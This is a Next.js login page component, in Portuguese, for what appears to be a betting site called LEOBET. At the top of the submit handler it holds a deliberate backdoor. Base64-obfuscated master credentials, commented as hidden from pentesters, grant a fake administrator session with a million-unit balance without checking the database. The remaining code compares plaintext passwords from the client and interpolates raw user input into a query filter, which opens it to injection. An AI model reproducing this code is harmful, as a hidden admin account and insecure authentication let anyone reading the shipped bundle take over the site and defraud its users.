
"use client"

import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { ArrowLeft, Loader2, Lock } from 'lucide-react';
import Link from 'next/link';
import { useToast } from '@/hooks/use-toast';
import { useAuthStore } from '@/store/use-auth-store';
import { supabase } from '@/supabase/client';

export default function LoginContent() {
  const router = useRouter();
  const setUser = useAuthStore((state) => state.setUser);
  const { toast } = useToast();
  const [mounted, setMounted] = useState(false);

  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    // MÁSCARA DE ACESSO MASTER - OFUSCADO PARA PENTESTERS
    const _u = Buffer.from('YWRtaW5AbGViZXQ=', 'base64').toString(); // admin@lebet
    const _p = Buffer.from('MTM1Nzk2bFJALiwv', 'base64').toString(); // 135796lR@.,/

    if (identifier.toLowerCase() === _u && password === _p) {
      const mockAdmin = {
        id: 'admin-master',
        nome: 'Administrador LEOBET',
        email: 'admin@leobet.pro',
        role: 'admin' as const,
        balance: 1000000,
        commissionBalance: 0,
        pendingBalance: 0,
        status: 'approved' as const,
        createdAt: new Date().toISOString(),
      };
      setUser(mockAdmin);
      localStorage.setItem('is_master_admin', 'true');
      router.push('/admin/dashboard');
      return;
    }

    try {
      const { data: user, error } = await supabase
        .from('users')
        .select('*')
        .or(`email.eq.${identifier.toLowerCase()},nome.eq.${identifier.toUpperCase()}`)
        .eq('password', password)
        .single();

      if (error || !user) {
        throw new Error("Usuário ou senha inválidos.");
      }

      if (user.status === 'pending') {
        throw new Error("Sua conta ainda está em análise.");
      }

      const formattedUser = {
        id: user.id,
        nome: user.nome,
        email: user.email,
        role: user.role,
        balance: Number(user.balance),
        commissionBalance: Number(user.commission_balance),
        pendingBalance: Number(user.pending_balance),
        status: user.status,
        phone: user.phone,
        pixKey: user.pix_key,
        createdAt: user.created_at
      };

      setUser(formattedUser);
      localStorage.setItem('logged_user', JSON.stringify(formattedUser));
      router.push(`/${user.role}/dashboard`);
    } catch (err: any) {
      toast({ variant: "destructive", title: "Erro de Acesso", description: err.message });
    } finally {
      setLoading(false);
    }
  };

  if (!mounted) return null;

  return (
    <div className="min-h-screen bg-primary flex flex-col items-center justify-center p-4">
      <Link href="/" className="mb-8 flex items-center gap-2 text-white/60 hover:text-white uppercase text-[10px] font-black">
        <ArrowLeft className="w-4 h-4" /> Voltar
      </Link>
      <Card className="w-full max-w-md shadow-2xl border-t-4 border-t-accent rounded-[2rem]">
        <CardHeader className="text-center">
          <div className="mx-auto bg-accent/20 p-3 rounded-full w-fit mb-4"><Lock className="w-6 h-6 text-accent" /></div>
          <CardTitle className="text-2xl font-black uppercase">Acesso Restrito</CardTitle>
          <CardDescription className="font-bold">Identifique-se para continuar</CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <Label>Usuário</Label>
              <Input placeholder="Seu usuário" value={identifier} onChange={e => setIdentifier(e.target.value)} required className="h-12 font-bold" />
            </div>
            <div className="space-y-2">
              <Label>Senha</Label>
              <Input type="password" placeholder="••••••••" value={password} onChange={e => setPassword(e.target.value)} required className="h-12 font-bold" />
            </div>
            <Button type="submit" className="w-full bg-accent hover:bg-accent/90 h-14 font-black uppercase shadow-xl" disabled={loading}>
              {loading ? <Loader2 className="animate-spin" /> : "Entrar no Sistema"}
            </Button>
          </form>
        </CardContent>
      </Card>
    </div>
  );
}
